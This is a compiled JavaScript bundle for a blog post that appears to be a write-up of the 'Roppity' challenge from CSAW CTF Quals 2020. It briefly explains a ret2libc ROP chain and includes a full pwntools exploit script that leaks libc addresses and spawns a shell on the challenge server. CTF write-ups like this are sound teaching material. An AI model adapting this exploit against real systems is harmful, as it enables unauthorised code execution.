_N_E=(window.webpackJsonp_N_E=window.webpackJsonp_N_E||[]).push([[10],{"+dRF":function(e,t,n){(window.__NEXT_P=window.__NEXT_P||[]).push(["/blog/roppity",function(){return n("aQzF")}])},"7ljp":function(e,t,n){"use strict";n.d(t,"a",(function(){return f}));var r=n("q1tI"),o=n.n(r);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function c(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function l(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?c(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):c(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function p(e,t){if(null==e)return{};var n,r,o=function(e,t){if(null==e)return{};var n,r,o={},a=Object.keys(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||(o[n]=e[n]);return o}(e,t);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}var i=o.a.createContext({}),s=function(e){var t=o.a.useContext(i),n=t;return e&&(n="function"===typeof e?e(t):l(l({},t),e)),n},u={inlineCode:"code",wrapper:function(e){var t=e.children;return o.a.createElement(o.a.Fragment,{},t)}},b=o.a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,a=e.originalType,c=e.parentName,i=p(e,["components","mdxType","originalType","parentName"]),b=s(n),f=r,d=b["".concat(c,".").concat(f)]||b[f]||u[f]||a;return n?o.a.createElement(d,l(l({ref:t},i),{},{components:n})):o.a.createElement(d,l({ref:t},i))}));function f(e,t){var n=arguments,r=t&&t.mdxType;if("string"===typeof e||r){var a=n.length,c=new Array(a);c[0]=b;var l={};for(var p in t)hasOwnProperty.call(t,p)&&(l[p]=t[p]);l.originalType=e,l.mdxType="string"===typeof e?e:r,c[1]=l;for(var i=2;i<a;i++)c[i]=n[i];return o.a.createElement.apply(null,c)}return o.a.createElement.apply(null,n)}b.displayName="MDXCreateElement"},FYTF:function(e,t,n){e.exports={post:"post_post__1Lsln",codeblock:"post_codeblock__jpvW3"}},Ff2n:function(e,t,n){"use strict";function r(e,t){if(null==e)return{};var n,r,o=function(e,t){if(null==e)return{};var n,r,o={},a=Object.keys(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||(o[n]=e[n]);return o}(e,t);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}n.d(t,"a",(function(){return r}))},Qetd:function(e,t,n){"use strict";var r=Object.assign.bind(Object);e.exports=r,e.exports.default=e.exports},aQzF:function(e,t,n){"use strict";n.r(t),n.d(t,"meta",(function(){return s})),n.d(t,"default",(function(){return b}));var r=n("rePB"),o=n("Ff2n"),a=(n("q1tI"),n("7ljp")),c=n("FYTF"),l=n.n(c);function p(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?p(Object(n),!0).forEach((function(t){Object(r.a)(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):p(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}var s={title:"Roppity (CSAW CTF Quals 2020)",description:"(CSAW CTF Quals 2020)",date:"September 14, 2020"},u={meta:s};function b(e){var t=e.components,n=Object(o.a)(e,["components"]);return Object(a.a)("wrapper",i(i(i({},u),n),{},{components:t,mdxType:"MDXLayout"}),Object(a.a)("div",{className:l.a.post},Object(a.a)("h1",null,"Roppity (CSAW CTF Quals 2020)"),Object(a.a)("h6",null,"September 14, 2020"),Object(a.a)("p",null,"The executable was compiled without support for position independent code. Because of this, a ROP chain could be built to leak the address of the ",Object(a.a)("code",null,"puts")," function in ",Object(a.a)("code",null,"libc")," through the global offset table. The executable was restarted by jumping back to ",Object(a.a)("code",null,"_","start"),". Using the address of ",Object(a.a)("code",null,"puts"),", the address of ",Object(a.a)("code",null,"system")," in ",Object(a.a)("code",null,"libc")," was calculated, which was used to spawn a shell."),Object(a.a)("div",{className:l.a.codeblock},Object(a.a)("pre",null,Object(a.a)("code",i({parentName:"pre"},{}),"from pwn import *\n\n#target = process('./rop')\n#libc = ELF('/usr/lib/libc.so.6')\n\n# pwn.chal.csaw.io 5016\ntarget = remote('pwn.chal.csaw.io', 5016)\nlibc = ELF('libc-2.27.so')\n\npop_rdi = 0x400683\ngot_puts = 0x601018\nplt_puts = 0x4004a0\nret = 0x40048e\nstart = 0x4004d0\n\npayload = b''\npayload += b'A'*40\npayload += p64(pop_rdi)\npayload += p64(got_puts) # leak addr\npayload += p64(plt_puts) # print address of puts in libc\npayload += p64(start) # restart\n\ntarget.recv() # Hello\ntarget.sendline(payload)\nlibc_puts = int.from_bytes((target.recv()[:-7]), byteorder='little') # Remove the second b'Hello\\n'\n\nlibc.address = libc_puts - libc.symbols['puts']\n\nbin_sh = next(libc.search(b'/bin/sh'))\n\nlibc_system = libc.symbols['system']\n\npayload = b''\npayload += b'A' * 40\npayload += p64(pop_rdi)\npayload += p64(bin_sh)\npayload += p64(ret)\npayload += p64(libc_system)\n\ntarget.sendline(payload)\ntarget.interactive()\n")))))}b.isMDXComponent=!0},rePB:function(e,t,n){"use strict";function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}n.d(t,"a",(function(){return r}))}},[["+dRF",0,1]]]);